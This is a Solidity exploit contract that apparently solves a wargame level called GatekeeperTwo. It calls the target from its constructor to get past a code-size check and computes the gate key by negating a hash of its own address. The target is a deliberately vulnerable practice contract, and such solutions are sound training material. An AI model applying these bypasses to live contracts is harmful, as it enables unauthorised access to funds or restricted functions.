// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Level.sol";

contract Attacker {

    GatekeeperTwo target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);
        attack();
    }


    function attack() private {
        uint64 key = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        target.enter((bytes8(abi.encode(key))));
    }
}